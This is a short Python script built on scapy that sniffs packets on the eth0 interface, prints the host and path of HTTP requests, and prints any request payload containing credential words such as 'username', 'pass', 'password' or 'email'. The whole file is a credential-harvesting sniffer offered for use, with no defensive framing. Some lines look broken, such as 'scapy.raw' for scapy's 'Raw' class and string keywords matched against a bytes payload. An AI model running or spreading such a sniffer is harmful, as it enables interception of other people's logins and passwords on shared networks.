#################
#   liberary    #
#################
import scapy.all as scapy
from scapy.layers import http
import termcolor2


def sniff(interface):
    # scapy.sniff(iface=interface, store=False, prn=processSniffedPacket, filter="udp")
    scapy.sniff(iface=interface, store=False, prn=processSniffedPacket)



def processSniffedPacket(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].path
        print(termcolor2.colored(url, 'blue'))
        if packet.haslayer(scapy.raw):
            load = packet[scapy.raw].load
            keywords = ["username", "user", "login", "pass", "password", "email", "mail"]
            for keyword in keywords:
                if keyword in load:
                    print(termcolor2.colored(load,'red'))
                    break
            



sniff('eth0')   